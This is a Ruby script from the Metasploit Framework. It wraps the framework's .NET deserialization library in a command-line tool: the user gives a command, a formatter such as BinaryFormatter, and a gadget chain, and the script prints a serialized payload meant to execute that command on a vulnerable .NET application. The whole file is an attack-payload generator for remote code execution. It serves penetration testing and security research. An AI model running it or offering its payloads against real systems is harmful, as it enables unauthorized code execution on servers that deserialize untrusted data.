#!/usr/bin/env ruby

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

msfbase = __FILE__
while File.symlink?(msfbase)
  msfbase = File.expand_path(File.readlink(msfbase), File.dirname(msfbase))
end
$:.unshift(File.expand_path(File.join(File.dirname(msfbase), '..', '..', '..', 'lib')))
require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex'
require 'optparse'

BANNER = %Q{
Usage: #{__FILE__} [options]

Example: #{__FILE__} -f BinaryFormatter
}

module YSoSerialDotNet
  class OptsConsole
    def self.parse(args)
      options = {}
      parser = OptionParser.new do |opt|
        opt.banner = BANNER
        opt.separator ''
        opt.separator 'Specific options:'

        opt.on('-c', '--command <String>', "The command to run") do |v|
          options[:command] = v
        end

        opt.on('-f', '--formatter <String>', "The formatter to use") do |v|
          options[:formatter] = v.to_sym
        end

        opt.on('-g', '--gadget <String>', "The gadget to use") do |v|
          options[:gadget_chain] = v.to_sym
        end

        opt.on_tail('-h', '--help', 'Show this message') do
          $stdout.puts opt
          exit
        end
      end

      parser.parse!(args)

      if options.empty?
        raise OptionParser::MissingArgument, 'No options set, try -h for usage'
      elsif options[:command].blank?
        raise OptionParser::MissingArgument, '-c is required'
        # todo: validate formatter and gadget_chain
      end

      options
    end
  end

  class Driver
    def initialize
      begin
        @opts = OptsConsole.parse(ARGV)
      rescue OptionParser::ParseError => e
        $stderr.puts "[x] #{e.message}"
        exit
      end
    end

    def run
      serialized = Msf::Util::DotNetDeserialization.generate(
        @opts[:command],
        gadget_chain: @opts[:gadget_chain],
        formatter: @opts[:formatter]
      )
      $stdout.puts serialized
    end

  end
end

if __FILE__ == $PROGRAM_NAME
  driver = YSoSerialDotNet::Driver.new
  begin
    driver.run
  rescue ::Exception => e
    elog("#{e.class}: #{e.message}\n#{e.backtrace * "\n"}")
    $stderr.puts "[x] #{e.class}: #{e.message}"
    $stderr.puts "[*] If necessary, please refer to framework.log for more details."
  end
end